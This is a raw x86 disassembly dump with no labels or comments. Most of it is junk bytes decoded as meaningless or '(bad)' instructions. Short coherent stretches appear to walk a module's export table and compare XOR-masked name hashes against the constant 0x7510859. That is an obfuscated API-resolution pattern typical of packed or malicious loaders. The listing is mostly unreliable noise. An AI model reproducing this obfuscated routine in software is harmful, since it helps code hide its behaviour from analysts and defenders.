  40b861:	aas    
  40b862:	mov    edx,0x3a8323e6
  40b867:	jmp    0xb67e:0x7e332109
  40b86e:	jle    0x40b8ee
  40b870:	jle    0x40b8be
  40b872:	jbe    0x40b8e5
  40b874:	xor    dh,BYTE PTR [eax-0xd4c28dd]
  40b87a:	push   edi
  40b87b:	icebp  
  40b87c:	xlat   BYTE PTR ds:[ebx]
  40b87d:	or     cl,BYTE PTR [edi]
  40b87f:	push   ecx
  40b880:	fidiv  WORD PTR [ecx-0x4fd80a60]
  40b886:	mov    eax,0x168fca7f
  40b88b:	and    ch,0x50
  40b88e:	push   edx
  40b88f:	or     BYTE PTR [esi+0x1450144d],cl
  40b895:	jmp    0x40b873
  40b897:	pop    edi
  40b898:	pop    es
  40b899:	add    DWORD PTR [eax+ebx*2-0x3683146],0xffffffa4
  40b8a1:	mov    edi,0x2c7d3bc4
  40b8a6:	(bad)  
  40b8a7:	(bad)  
  40b8a8:	out    dx,al
  40b8a9:	add    eax,0xa2784b81
  40b8ae:	cld    
  40b8af:	add    ecx,DWORD PTR ds:0xa6826404
  40b8b5:	xchg   ebx,eax
  40b8b6:	mov    ebp,0xd2d56910
  40b8bb:	imul   ebp,DWORD PTR [eax+0x16],0xc14dcbd7
  40b8c2:	xor    DWORD PTR [edx],0xffffffd8
  40b8c5:	mov    eax,DWORD PTR [eax-0x22]
  40b8c8:	int3   
  40b8c9:	jne    0x40b906
  40b8cb:	push   eax
  40b8cc:	xchg   BYTE PTR [esi-0x35],ch
  40b8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8d0:	pushf  
  40b8d1:	cdq    
  40b8d2:	fcomp  DWORD PTR [edi+0x6eacddcb]
  40b8d8:	cmp    bh,ah
  40b8da:	sbb    eax,0xe08b2ce3
  40b8df:	xor    edi,DWORD PTR [esi]
  40b8e1:	pop    eax
  40b8e2:	sbb    eax,0x5d6434f8
  40b8e7:	dec    eax
  40b8e8:	mov    ecx,0x77300c6c
  40b8ed:	sti    
  40b8ee:	call   0x4f8c:0xa86d2d56
  40b8f5:	xor    eax,0x2d3d8416
  40b8fa:	xchg   ecx,eax
  40b8fb:	dec    ecx
  40b8fc:	bound  esi,QWORD PTR [ecx+0x42]
  40b8ff:	sbb    edx,DWORD PTR [eax]
  40b901:	cmp    cl,BYTE PTR [esi]
  40b903:	cmp    ah,bh
  40b905:	rcr    DWORD PTR [ebp+0x4cb6c4cd],0xd6
  40b90c:	xor    ch,dh
  40b90e:	xlat   BYTE PTR ds:[ebx]
  40b90f:	ja     0x40b92d
  40b911:	and    al,0xdc
  40b913:	cmp    eax,0xb62124a7
  40b918:	sub    al,0x20
  40b91a:	cwde   
  40b91b:	shl    DWORD PTR [edx-0x1c],cl
  40b91e:	cs adc al,0xb5
  40b921:	daa    
  40b922:	(bad)  
  40b924:	test   eax,0x7df35406
  40b929:	add    al,0x4a
  40b92b:	lahf   
  40b92c:	gs out dx,al
  40b92e:	cmp    eax,0x13637c57
  40b933:	call   DWORD PTR [ecx]
  40b935:	push   esp
  40b936:	sar    DWORD PTR [ebp-0x2bb27672],1
  40b93c:	mov    eax,DWORD PTR [ebp-0x14]
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	or     ch,BYTE PTR [edi+0x3379aaaa]
  40b96a:	jle    0x40b9ea
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	pop    DWORD PTR [ebp-0x49]
  40b973:	cmc    
  40b974:	push   edx
  40b975:	outs   dx,BYTE PTR ds:[esi]
  40b976:	xor    BYTE PTR [eax+0x7d],bl
  40b979:	push   0xfffffff5
  40b97b:	icebp  
  40b97c:	mov    ebx,0xd159637d
  40b981:	add    eax,0xa784ac71
  40b986:	or     eax,DWORD PTR [ecx+0x4cb4916a]
  40b98c:	retf   
  40b98d:	or     esi,DWORD PTR ds:[esi+ebp*2-0x55981ea4]
  40b995:	dec    ecx
  40b996:	ins    DWORD PTR es:[edi],dx
  40b997:	or     BYTE PTR [eax+ecx*1+0xaaa22b1],al
  40b99e:	push   ebx
  40b99f:	push   edx
  40b9a0:	dec    ecx
  40b9a1:	mov    bh,0x36
  40b9a3:	cwde   
  40b9a4:	add    al,0xfe
  40b9a6:	retf   
  40b9a7:	jbe    0x40b94d
  40b9a9:	mov    edx,0x7f3e2091
  40b9ae:	jne    0x40b9a8
  40b9b0:	pop    ecx
  40b9b1:	popf   
  40b9b2:	or     dl,BYTE PTR [edi]
  40b9b4:	cmp    edi,DWORD PTR [ecx+edx*2-0x64]
  40b9b8:	mov    ebp,0x96546450
  40b9bd:	mov    esi,0x30c03fc8
  40b9c2:	fcmovbe st,st(1)
  40b9c4:	(bad)  
  40b9c5:	jmp    0x40ba1f
  40b9c7:	add    eax,0x185eb373
  40b9cc:	adc    eax,0x6ffd94dd
  40b9d1:	lds    edi,FWORD PTR [ebp-0x5]
  40b9d4:	out    0x33,eax
  40b9d6:	sahf   
  40b9d7:	and    ebp,esp
  40b9d9:	xchg   edi,eax
  40b9da:	jg     0x40ba36
  40b9dc:	lods   eax,DWORD PTR ds:[esi]
  40b9dd:	gs out dx,al
  40b9df:	mov    ebp,0x7f35643b
  40b9e4:	inc    ecx
  40b9e5:	cmp    cl,BYTE PTR [eax-0x5a]
  40b9e8:	mov    ?,WORD PTR [edx+edi*4-0x2e]
  40b9ec:	xchg   edi,eax
  40b9ed:	sbb    eax,0xfd197525
  40b9f2:	mov    ebp,0xc6186eae
  40b9f7:	fcomp  DWORD PTR [ebx+0x573c6e1f]
  40b9fd:	adc    DWORD PTR [ebx-0x57],0xfffffff0
  40ba01:	adc    al,0xe1
  40ba03:	clc    
  40ba04:	leave  
  40ba05:	cmc    
  40ba06:	fiadd  DWORD PTR [ebx-0x2a]
  40ba09:	shl    dl,cl
  40ba0b:	mov    ebx,ss
  40ba0d:	pop    ss
  40ba0e:	call   0xe5c355b9
  40ba13:	cwde   
  40ba14:	xor    al,0x42
  40ba16:	lock add cl,bh
  40ba19:	xor    eax,0x419b6cc2
  40ba1e:	and    bh,ah
  40ba20:	jns    0x40b9b0
  40ba22:	sbb    eax,0x1ac98ce
  40ba27:	jle    0x40ba6d
  40ba29:	jl     0x40ba49
  40ba2b:	adc    eax,0xfadaf237
  40ba30:	push   eax
  40ba31:	or     esi,0xd4def226
  40ba37:	jno    0x40b9c6
  40ba39:	inc    ebp
  40ba3a:	clc    
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock fcmove st,st(5)
  40ba75:	push   esi
  40ba76:	pop    ss
  40ba77:	mov    cl,0x30
  40ba79:	jle    0x40baf9
  40ba7b:	mov    dh,0x7e
  40ba7d:	jle    0x40bafd
  40ba7f:	pusha  
  40ba80:	rcr    BYTE PTR [esi-0x3e],0x44
  40ba84:	cmp    eax,0x15515e91
  40ba89:	into   
  40ba8a:	mov    ch,0xad
  40ba8c:	add    eax,0x36235fe5
  40ba91:	and    DWORD PTR [edx+0x69],ebp
  40ba94:	add    DWORD PTR [edx-0x232585b6],edi
  40ba9a:	pop    ss
  40ba9b:	rcr    BYTE PTR [edx-0x201c12c4],cl
  40baa1:	pop    esi
  40baa2:	jno    0x40ba88
  40baa4:	mov    ds:0xe35c48f2,al
  40baa9:	repnz xor bh,BYTE PTR [esi-0x7a]
  40baad:	xchg   ebx,eax
  40baae:	mov    bl,0x9
  40bab0:	cli    
  40bab1:	imul   ebp,DWORD PTR [ecx+0x27ec31e0],0xfffffff6
  40bab8:	push   ebp
  40bab9:	jecxz  0x40baf5
  40babb:	test   eax,0xa5d24c48
  40bac0:	outs   dx,DWORD PTR cs:[esi]
  40bac2:	lahf   
  40bac3:	clc    
  40bac4:	lods   al,BYTE PTR ds:[esi]
  40bac5:	pop    ecx
  40bac6:	out    dx,eax
  40bac7:	lea    ecx,[ecx-0x5]
  40baca:	pop    eax
  40bacb:	xor    al,0x90
  40bacd:	mov    bl,0x3a
  40bacf:	in     eax,dx
  40bad0:	pop    edx
  40bad1:	shl    DWORD PTR [ebp-0x401162b6],0x6d
  40bad8:	add    ch,BYTE PTR [ebp-0x4c1d1a9a]
  40bade:	scas   eax,DWORD PTR es:[edi]
  40badf:	and    DWORD PTR [eax+esi*8+0x6255a200],ebx
  40bae6:	ret    0x8c6f
  40bae9:	(bad)  
  40baea:	aas    
  40baeb:	cwde   
  40baec:	(bad)  
  40baed:	and    dh,BYTE PTR [eax+0x58]
  40baf0:	mov    dh,0x5f
  40baf2:	xor    al,0x6e
  40baf4:	fsub   QWORD PTR [ebx]
  40baf6:	mov    edi,0x6f847ee8
  40bafb:	es lahf 
  40bafd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bafe:	iret   
  40baff:	call   0x9ede:0xdb86ef6d
  40bb06:	pushf  
  40bb07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb08:	(bad)  
  40bb09:	ret    0x53f4
  40bb0c:	(bad)  
  40bb0d:	enter  0x9483,0x95
  40bb11:	(bad)  
  40bb12:	call   0x15b3:0xe347532d
  40bb19:	sub    esi,ecx
  40bb1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb1c:	inc    esi
  40bb1d:	pop    ebx
  40bb1e:	(bad)  
  40bb1f:	pop    ebx
  40bb20:	sub    ebx,DWORD PTR [ebx-0x6a348fc0]
  40bb26:	pop    es
  40bb27:	cwde   
  40bb28:	aad    0x5
  40bb2a:	std    
  40bb2b:	xchg   ecx,eax
  40bb2c:	add    eax,0x163ae924
  40bb31:	test   eax,0x5c4c79ed
  40bb36:	cmp    ch,BYTE PTR [edx]
  40bb38:	std    
  40bb39:	in     eax,0x3c
  40bb3b:	jno    0x40bac4
  40bb3d:	sti    
  40bb3e:	sub    al,0x1f
  40bb40:	into   
  40bb41:	loope  0x40bafa
  40bb43:	adc    al,0x5c
  40bb45:	shl    BYTE PTR [edx+0x47],1
  40bb48:	cmp    edi,eax
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	rcr    DWORD PTR [edi+0x31890dec],0x7e
  40bbc8:	jle    0x40bb80
  40bbca:	jle    0x40bc4a
  40bbcc:	jle    0x40bc49
  40bbce:	in     al,0xb4
  40bbd0:	jbe    0x40bbb8
  40bbd2:	mov    dl,0xca
  40bbd4:	sbb    esi,DWORD PTR [edx]
  40bbd6:	cmp    ecx,DWORD PTR [esi]
  40bbd8:	test   al,0xa
  40bbda:	xor    eax,eax
  40bbdc:	cmp    al,0xe1
  40bbde:	inc    esp
  40bbdf:	or     ah,dl
  40bbe1:	lea    esi,[esi]
  40bbe3:	jg     0x40bbfa
  40bbe5:	inc    ebp
  40bbe6:	mov    eax,ds:0xedd13f35
  40bbeb:	dec    esi
  40bbec:	imul   esp,ebx,0xffffffbe
  40bbef:	or     ecx,esi
  40bbf1:	popf   
  40bbf2:	add    dh,BYTE PTR [esi]
  40bbf4:	inc    ebx
  40bbf5:	pushf  
  40bbf6:	(bad)  
  40bbf7:	out    dx,al
  40bbf8:	add    cl,BYTE PTR [eax]
  40bbfa:	das    
  40bbfb:	cmp    dl,bl
  40bbfd:	fwait
  40bbfe:	push   esi
  40bbff:	sti    
  40bc00:	cld    
  40bc01:	xchg   BYTE PTR [edx],bl
  40bc03:	cdq    
  40bc04:	and    edi,eax
  40bc06:	mov    cl,0x4
  40bc08:	je     0x40bbdb
  40bc0a:	adc    bl,BYTE PTR [ecx+edx*8+0x23]
  40bc0e:	lock sub bh,BYTE PTR [edi+0x6cbf1b03]
  40bc15:	mul    esp
  40bc17:	sbb    ebx,edx
  40bc19:	(bad)
  40bc1c:	aad    0x89
  40bc1e:	mov    al,ds:0xdc11dda5
  40bc23:	dec    ecx
  40bc24:	or     DWORD PTR [ebp-0x3c],eax
  40bc27:	addr16 xor eax,0x4101f513
  40bc2d:	(bad)  
  40bc2e:	fnstcw WORD PTR ds:0x125a2b55
  40bc34:	and    eax,0xfce104b7
  40bc39:	repnz xor edi,ebp
  40bc3c:	shl    DWORD PTR [ecx+edi*2+0x6a],cl
  40bc40:	sub    cl,BYTE PTR [edx+0x2b6a80fb]
  40bc46:	add    al,BYTE PTR [ebx+eax*4-0x33]
  40bc4a:	fnstenv [ebp-0x124ebb23]
  40bc50:	les    edx,FWORD PTR [ecx-0xbf9819a]
  40bc56:	dec    esp
  40bc57:	addr16 fwait
  40bc59:	sbb    edx,DWORD PTR [ecx]
  40bc5b:	js     0x40bc30
  40bc5d:	xchg   esp,eax
  40bc5e:	sti    
  40bc5f:	(bad)  [ecx+0x21]
  40bc62:	mov    eax,ebx
  40bc64:	jb     0x40bbf2
  40bc66:	xchg   DWORD PTR [edi],ecx
  40bc68:	(bad)  
  40bc6a:	dec    esi
  40bc6b:	out    0xf2,al
  40bc6d:	mov    eax,ds:0xff95840d
  40bc72:	ror    ch,cl
  40bc74:	lods   eax,DWORD PTR ds:[esi]
  40bc75:	fsubr  QWORD PTR [ebx+0x2d7f63ef]
  40bc7b:	mov    ebp,ebp
  40bc7d:	xor    BYTE PTR [ecx-0x78],ah
  40bc80:	fdecstp 
  40bc82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc83:	lea    eax,[eax]
  40bc85:	mov    BYTE PTR [ecx],ch
  40bc87:	mov    ah,0x41
  40bc89:	push   esi
  40bc8a:	xor    dh,ah
  40bc8c:	jno    0x40bc4d
  40bc8e:	and    bh,cl
  40bc90:	push   edx
  40bc91:	pusha  
  40bc92:	jo     0x40bce3
  40bc94:	jne    0x40bcf1
  40bc96:	xchg   ebx,ecx
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	sahf   
  40bcc2:	stos   BYTE PTR es:[edi],al
  40bcc3:	imul   ebp,esi,0x7e7e36c1
  40bcc9:	mov    dh,0x7e
  40bccb:	jle    0x40bd4b
  40bccd:	xchg   DWORD PTR [edi],ebx
  40bccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcd0:	gs mov edi,0xb3261d34
  40bcd6:	mov    ch,BYTE PTR [eax]
  40bcd8:	retf   
  40bcd9:	push   es
  40bcda:	fxtract 
  40bcdc:	iret   
  40bcdd:	mov    ds:0x8eecf4bb,al
  40bce2:	in     eax,dx
  40bce3:	pop    esi
  40bce4:	retf   
  40bce5:	dec    eax
  40bce6:	sub    cl,BYTE PTR [ebx]
  40bce8:	call   0x9af:0x897f95b5
  40bcef:	ins    BYTE PTR es:[edi],dx
  40bcf0:	jo     0x40bcb8
  40bcf2:	mov    cl,0xfd
  40bcf4:	mov    ds:0x8d2bda4c,al
  40bcf9:	add    edx,edi
  40bcfb:	sub    BYTE PTR [edi-0x61482259],dl
  40bd01:	(bad)
  40bd05:	sub    BYTE PTR [esi-0x6f486924],bh
  40bd0b:	push   es
  40bd0c:	gs scas eax,DWORD PTR es:[edi]
  40bd0e:	jmp    0xbe3e:0xa9578f03
  40bd15:	jmp    0x40bd75
  40bd17:	push   esp
  40bd18:	xlat   BYTE PTR ds:[ebx]
  40bd19:	jno    0x40bd6a
  40bd1b:	or     edi,DWORD PTR [ebx-0x43]
  40bd1e:	push   ecx
  40bd1f:	xor    dh,ch
  40bd21:	(bad)  
  40bd22:	sti    
  40bd23:	jmp    0x14183609
  40bd28:	push   0xf776be84
  40bd2d:	pop    esi
  40bd2e:	scas   al,BYTE PTR es:[edi]
  40bd2f:	sub    dl,0xa1
  40bd32:	push   esi
  40bd33:	sbb    bl,BYTE PTR [ecx-0x34]
  40bd36:	dec    edx
  40bd37:	push   esi
  40bd38:	repz push 0xc
  40bd3b:	fdiv   DWORD PTR [esi]
  40bd3d:	xor    al,0x65
  40bd3f:	xchg   cl,cl
  40bd41:	sbb    ecx,DWORD PTR [edi+0x69]
  40bd44:	loopne 0x40bce8
  40bd46:	or     ebx,DWORD PTR [edi+esi*2+0x7c]
  40bd4a:	loopne 0x40bd72
  40bd4c:	stos   DWORD PTR es:[edi],eax
  40bd4d:	push   ebp
  40bd4e:	push   esi
  40bd4f:	push   0xffffffc2
  40bd51:	inc    edi
  40bd52:	ds or  eax,0x480f1aca
  40bd58:	(bad)  
  40bd59:	sub    bh,BYTE PTR [edi+eiz*2+0x13ba347d]
  40bd60:	jo     0x40bd30
  40bd62:	pop    eax
  40bd63:	xchg   ebx,eax
  40bd64:	repz add ebx,DWORD PTR [ebx-0x607e1f36]
  40bd6b:	mov    edx,0x39acefc7
  40bd70:	push   ecx
  40bd71:	push   esi
  40bd72:	mov    ch,0xb
  40bd74:	inc    esp
  40bd75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd76:	mov    eax,ds:0x714eaf3c
  40bd7b:	add    al,0xd3
  40bd7d:	pusha  
  40bd7e:	sbb    eax,0x98041ca9
  40bd83:	(bad)  
  40bd84:	push   ds
  40bd85:	mov    eax,ds:0xf1e647ee
  40bd8a:	mov    ebp,0x54a1a829
  40bd8f:	push   ebp
  40bd90:	fld    DWORD PTR [ecx-0x69]
  40bd93:	repz (bad) [ebx]
  40bd96:	sar    DWORD PTR [edx+0x32729f],0x3
  40bd9d:	ret    0x4589
  40bda0:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	daa    
  40bdbd:	cld    
  40bdbe:	loop   0x40be25
  40bdc0:	sbb    DWORD PTR [edi],esi
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	lea    edi,[edi-0x2e]
  40bdcb:	mov    eax,ds:0x14ec3fe
  40bdd0:	pop    ss
  40bdd1:	ds mov cl,0x5
  40bdd4:	add    DWORD PTR [ebx+0x2634499f],ebx
  40bdda:	mov    dh,0xb1
  40bddc:	retf   
  40bddd:	xor    DWORD PTR [edx],eax
  40bddf:	mul    BYTE PTR [ebp-0x1e]
  40bde2:	jp     0x40be5c
  40bde4:	jae    0x40bdb3
  40bde6:	pop    ecx
  40bde7:	lock ins DWORD PTR es:[edi],dx
  40bde9:	add    al,dl
  40bdeb:	call   0xa2ec8cbc
  40bdf0:	xchg   edx,eax
  40bdf1:	ins    DWORD PTR es:[edi],dx
  40bdf2:	sub    al,0x20
  40bdf4:	xchg   edx,eax
  40bdf5:	xchg   DWORD PTR [ecx-0x6a],ebx
  40bdf8:	xchg   ebx,eax
  40bdf9:	cld    
  40bdfa:	sub    DWORD PTR [eax+0x34],ebx
  40bdfd:	out    dx,al
  40bdfe:	ss ja  0x40bd83
  40be01:	xor    dl,ah
  40be03:	addr16 jmp 0xe0a4:0x3949e134
  40be0b:	lods   eax,DWORD PTR ds:[esi]
  40be0c:	jne    0x40bdac
  40be0e:	add    al,0x4
  40be10:	loope  0x40bde0
  40be12:	adc    bl,bl
  40be14:	(bad)  [ebp+0x536d5896]
  40be1a:	fwait
  40be1b:	mov    edi,0xb5592ca6
  40be20:	mov    cl,BYTE PTR [edi+ecx*8]
  40be23:	je     0x40be6e
  40be25:	jecxz  0x40be0f
  40be27:	mov    ecx,0x97bb8fb3
  40be2c:	xchg   esi,eax
  40be2d:	mov    eax,0x931a06ce
  40be32:	ss pop esp
  40be34:	dec    ecx
  40be35:	outs   dx,DWORD PTR ds:[esi]
  40be36:	nop
  40be37:	jp     0x40be39
  40be39:	jle    0x40be07
  40be3b:	aam    0x54
  40be3d:	pop    eax
  40be3e:	jb     0x40beb4
  40be40:	icebp  
  40be41:	push   0x2feda1a6
  40be46:	xor    DWORD PTR [esi+0x29],0x1f302973
  40be4d:	in     eax,0x1d
  40be4f:	jo     0x40be36
  40be51:	xor    al,0xa8
  40be53:	cmp    al,0x5
  40be55:	inc    eax
  40be56:	mov    al,ds:0x443ff9d3
  40be5b:	or     DWORD PTR [esi],0x4ccf574f
  40be61:	mov    esi,DWORD PTR [edx-0x4a53707b]
  40be67:	xchg   ebp,eax
  40be68:	dec    ebx
  40be69:	adc    eax,0x8419c888
  40be6e:	sub    eax,0x31a8dde
  40be73:	pop    edx
  40be74:	sbb    ebp,0xffffffed
  40be77:	loop   0x40be89
  40be79:	aas    
  40be7a:	loop   0x40becf
  40be7c:	data16 sahf 
  40be7e:	push   esp
  40be7f:	test   eax,0x263ba0c
  40be84:	rol    BYTE PTR ss:[edx+0x6d],cl
  40be88:	mov    dl,0x3e
  40be8a:	jl     0x40be34
  40be8c:	iret   
  40be8d:	inc    esp
  40be8e:	push   es
  40be8f:	mov    ah,0xf
  40be91:	scas   eax,DWORD PTR es:[edi]
  40be92:	add    ch,cl
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0xc907640
  40bea6:	xchg   edx,eax
  40bea7:	out    0x51,al
  40bea9:	aaa    
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	(bad)  
  40beb1:	leave  
  40beb2:	stos   BYTE PTR es:[edi],al
  40beb3:	addr16 jp 0x40bf27
  40beb6:	mov    DWORD PTR [edx+0x48],eax
  40beb9:	daa    
  40beba:	add    BYTE PTR [ecx+0x69414725],ah
  40bec0:	ret    0x9a23
  40bec3:	and    al,0xd8
  40bec5:	in     eax,dx
  40bec6:	fcomi  st,st(7)
  40bec8:	jmp    0xe2a4:0x7d34912b
  40becf:	mov    eax,0x6102f951
  40bed4:	sub    BYTE PTR [ebp-0x99ef424],0x29
  40bedb:	push   DWORD PTR ds:0x95c7a03c
  40bee2:	out    dx,al
  40bee3:	push   edi
  40bee4:	xor    al,0xbc
  40bee6:	cld    
  40bee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bee8:	rcr    DWORD PTR [edx],0x93
  40beeb:	dec    ecx
  40beec:	psrld  mm4,QWORD PTR [ebx]
  40beef:	sbb    cl,BYTE PTR [ecx]
  40bef1:	sub    BYTE PTR [edi-0x53],ch
  40bef4:	xlat   BYTE PTR ds:[ebx]
  40bef5:	pop    esi
  40bef6:	lods   eax,DWORD PTR ds:[esi]
  40bef7:	into   
  40bef8:	or     BYTE PTR [edx-0x74c5d4f2],cl
  40befe:	inc    edi
  40beff:	inc    esp
  40bf00:	adc    bl,BYTE PTR [ebx+0x4e]
  40bf03:	xchg   DWORD PTR [bp+di+0x6c],edi
  40bf07:	je     0x40bf42
  40bf09:	and    ah,BYTE PTR ds:0xf4f80fc5
  40bf0f:	test   al,0x79
  40bf11:	xchg   ebx,eax
  40bf12:	adc    BYTE PTR [edi+ebp*4],ch
  40bf15:	mov    bh,bh
  40bf17:	and    BYTE PTR [esi],bl
  40bf19:	push   ds
  40bf1a:	mov    esi,0x2348330a
  40bf1f:	mov    al,0x92
  40bf21:	mov    bl,BYTE PTR [eax+0x6b71c9f1]
  40bf27:	add    al,0x9f
  40bf29:	push   esi
  40bf2a:	clc    
  40bf2b:	ins    DWORD PTR es:[edi],dx
  40bf2c:	or     ah,bh
  40bf2e:	and    ecx,DWORD PTR [eax-0x7a761943]
  40bf34:	in     eax,dx
  40bf35:	mov    bh,0x58
  40bf37:	jmp    0xbf851614
  40bf3c:	pop    ebx
  40bf3d:	sub    ebx,DWORD PTR [edx]
  40bf3f:	sbb    eax,0x3a6a5439
  40bf44:	ret    0x8564
  40bf47:	mov    esi,0x822fd20c
  40bf4c:	mov    dh,0x90
  40bf4e:	or     eax,DWORD PTR [edx]
  40bf50:	nop
  40bf51:	and    ch,ch
  40bf53:	or     bh,bl
  40bf55:	mov    al,0x3f
  40bf57:	jnp    0x40bf5e
  40bf59:	inc    ebp
  40bf5a:	adc    al,0xfd
  40bf5c:	int    0x8b
  40bf5e:	into   
  40bf5f:	sub    DWORD PTR ds:0x5501d6a2,edx
  40bf65:	arpl   WORD PTR [ebx-0x48f4a0fd],cx
  40bf6b:	push   ecx
  40bf6c:	mov    dh,0xab
  40bf6e:	fld    QWORD PTR [bp+0x46a3]
  40bf73:	push   0xffffffe9
  40bf75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf76:	outs   dx,BYTE PTR ds:[esi]
  40bf77:	aad    0x8b
  40bf79:	push   ebp
  40bf7a:	cld    
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	push   eax
  40bfae:	xchg   ecx,eax
  40bfaf:	and    DWORD PTR [esi+0x7e7e34a9],0x7e7e7eb6
  40bfb9:	cwde   
  40bfba:	or     DWORD PTR [ebx],ebx
  40bfbc:	xor    ax,0x60e4
  40bfc0:	mov    ds:0xe30762ee,eax
  40bfc5:	lea    esi,[ecx-0x2f0856c6]
  40bfcb:	cmpxchg eax,ecx
  40bfce:	mov    ecx,ecx
  40bfd0:	xchg   ebx,eax
  40bfd1:	popa   
  40bfd2:	out    dx,eax
  40bfd3:	xor    dh,cl
  40bfd5:	div    DWORD PTR [edi]
  40bfd7:	dec    ecx
  40bfd8:	cld    
  40bfd9:	stos   DWORD PTR es:[edi],eax
  40bfda:	ss lock jmp 0xb75aef07
  40bfe1:	sub    al,dh
